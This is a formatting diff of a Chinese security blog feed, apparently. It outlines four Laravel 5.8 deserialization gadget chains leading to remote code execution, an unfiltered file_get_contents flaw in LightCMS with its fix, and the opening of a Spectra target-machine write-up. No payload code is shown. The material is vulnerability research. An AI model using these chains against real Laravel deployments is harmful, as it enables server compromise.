 &lt;p&gt;find可用来查找系统中指定文件，同时它也有执行命令的能力。&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -1831,8 +2316,10 @@ php artisan serve --host&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0.0.0.0
 &lt;/div&gt;
 &lt;/div&gt;&lt;h2 id=&#34;pop链分析&#34;&gt;POP链分析&lt;/h2&gt;
 &lt;h3 id=&#34;rce1&#34;&gt;rce1&lt;/h3&gt;
-&lt;p&gt;&lt;strong&gt;入口类&lt;/strong&gt;：&lt;code&gt;vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php/PendingBroadcast&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;RCE调用类&lt;/strong&gt;：&lt;code&gt;vendor/fzaninotto/faker/src/Faker/Generator.php/Generator&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;入口类：&lt;code&gt;vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php/PendingBroadcast&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;RCE调用类：&lt;code&gt;vendor/fzaninotto/faker/src/Faker/Generator.php/Generator&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
 &lt;p&gt;老规矩，从&lt;code&gt;__destruct&lt;/code&gt;入手&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;PendingBroadcast::__destruct()&lt;/code&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -1971,8 +2458,10 @@ php artisan serve --host&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0.0.0.0
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;h3 id=&#34;rce2&#34;&gt;rce2&lt;/h3&gt;
-&lt;p&gt;&lt;strong&gt;入口类&lt;/strong&gt;：&lt;code&gt;vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php/PendingBroadcast&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;RCE调用类&lt;/strong&gt;：&lt;code&gt;vendor/laravel/framework/src/Illuminate/Validation/Validator.php/Validator&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;入口类：&lt;code&gt;vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php/PendingBroadcast&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;RCE调用类：&lt;code&gt;vendor/laravel/framework/src/Illuminate/Validation/Validator.php/Validator&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
 &lt;p&gt;还是从&lt;code&gt;PendingBroadcast::__destruct()&lt;/code&gt;入手，还是找魔术方法&lt;code&gt;__call&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;PendingBroadcast::__destruct()&lt;/code&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -2109,8 +2598,10 @@ php artisan serve --host&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0.0.0.0
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;h3 id=&#34;rce3&#34;&gt;rce3&lt;/h3&gt;
-&lt;p&gt;&lt;strong&gt;入口类&lt;/strong&gt;：&lt;code&gt;vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php/PendingBroadcast&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;RCE调用类&lt;/strong&gt;：&lt;code&gt;vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php/Dispatcher&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;入口类：&lt;code&gt;vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php/PendingBroadcast&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;RCE调用类：&lt;code&gt;vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php/Dispatcher&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
 &lt;p&gt;又双叒叕是从&lt;code&gt;PendingBroadcast::__destruct()&lt;/code&gt;入手，这条链子是通过寻找同名方法dispatch实现RCE&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;PendingBroadcast::__destruct()&lt;/code&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -2288,8 +2779,10 @@ php artisan serve --host&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0.0.0.0
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;h3 id=&#34;rce4&#34;&gt;rce4&lt;/h3&gt;
-&lt;p&gt;&lt;strong&gt;入口类&lt;/strong&gt;：&lt;code&gt;vendor/laravel/framework/src/Illuminate/Foundation/Testing/PendingCommand.php/PendingCommand&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;RCE调用类&lt;/strong&gt;：&lt;code&gt;vendor/laravel/framework/src/Illuminate/Container/BoundMethod.php/BoundMethod&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;入口类：&lt;code&gt;vendor/laravel/framework/src/Illuminate/Foundation/Testing/PendingCommand.php/PendingCommand&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;RCE调用类：&lt;code&gt;vendor/laravel/framework/src/Illuminate/Container/BoundMethod.php/BoundMethod&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
 &lt;p&gt;5.8的Symfony组件貌似已经无法利用了，就复现下一条，这一条是laravel5.7版本的CVE(CVE-2019-9081)，但是5.8仍然适用。&lt;/p&gt;
 &lt;p&gt;这条链子也是&lt;code&gt;__destruct&lt;/code&gt;开始&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;Illuminate\Foundation\Testing\PendingCommand::__destruct&lt;/code&gt;&lt;/p&gt;
@@ -4493,10 +4986,10 @@ put smbscript.sh
 &lt;p&gt;项目地址：&lt;a href=&#34;https://github.com/eddy8/LightCMS&#34;&gt;LightCMS&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;LightCMS基于Laravel二次开发，所以启动方法也差不多，具体的搭建过程直接参考仓库说明即可。&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;：
-1、安装组件时如果无法生成&lt;strong&gt;vendor&lt;/strong&gt;目录可以运行&lt;code&gt;composer install --ignore-platform-reqs&lt;/code&gt;命令
-2、启动服务时&lt;code&gt;Illuminate\Database\QueryException&lt;/code&gt;报错可能是因为没有安装php-mysql依赖，参考&lt;a href=&#34;https://www.codegrepper.com/code-examples/sql/could+not+find+driver+%28SQL%3A+select+%2A+from+information_schema.tables+where+table_schema+%3D+francis_koopmart+and+table_name+%3D+migrations+and+table_type+%3D+%27BASE+TABLE%27%29&#34;&gt;文章&lt;/a&gt;安装（具体看报错信息找解决方案）
-3、满足数据库要求：修改&lt;code&gt;.env&lt;/code&gt;文件数据库用户密码 或 mysql新建需要的用户：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;：&lt;/p&gt;
+&lt;p&gt;1、安装组件时如果无法生成&lt;strong&gt;vendor&lt;/strong&gt;目录可以运行&lt;code&gt;composer install --ignore-platform-reqs&lt;/code&gt;命令&lt;/p&gt;
+&lt;p&gt;2、启动服务时&lt;code&gt;Illuminate\Database\QueryException&lt;/code&gt;报错可能是因为没有安装php-mysql依赖，参考&lt;a href=&#34;https://www.codegrepper.com/code-examples/sql/could+not+find+driver+%28SQL%3A+select+%2A+from+information_schema.tables+where+table_schema+%3D+francis_koopmart+and+table_name+%3D+migrations+and+table_type+%3D+%27BASE+TABLE%27%29&#34;&gt;文章&lt;/a&gt;安装（具体看报错信息找解决方案）&lt;/p&gt;
+&lt;p&gt;3、满足数据库要求：修改&lt;code&gt;.env&lt;/code&gt;文件数据库用户密码 或 mysql新建需要的用户：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -4580,7 +5073,7 @@ put smbscript.sh
 &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;可以看到这里使用了敏感函数&lt;strong&gt;file_get_contents&lt;/strong&gt;且没有任何过滤，读取文件后就直接保存文件（读取文件保存过程一堆跳来跳去的代码给我看懵了，不严谨地来说没啥WAF&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;可以看到这里使用了敏感函数&lt;strong&gt;file_get_contents&lt;/strong&gt;且没有任何过滤，读取文件后就直接保存文件&lt;/p&gt;
 &lt;h2 id=&#34;修复方案&#34;&gt;修复方案&lt;/h2&gt;
 &lt;p&gt;作者的&lt;a href=&#34;https://github.com/eddy8/LightCMS/commit/20a5b11a5bf417331878fc0b5063a9853b50ff3c&#34;&gt;commit&lt;/a&gt;记录：&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;App\Http\Controllers\Admin\NEditorController::fetchImageFile&lt;/code&gt;&lt;/p&gt;
@@ -4709,8 +5202,8 @@ put smbscript.sh
                 <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                 
                     <description>&lt;blockquote&gt;
-&lt;p&gt;靶机：Spectra
-难度：Easy&lt;/p&gt;
+&lt;p&gt;靶机：Spectra&lt;/p&gt;
+&lt;p&gt;难度：Easy&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h2 id=&#34;信息收集&#34;&gt;信息收集&lt;/h2&gt;
 &lt;h3 id=&#34;nmap扫描&#34;&gt;nmap扫描&lt;/h3&gt;
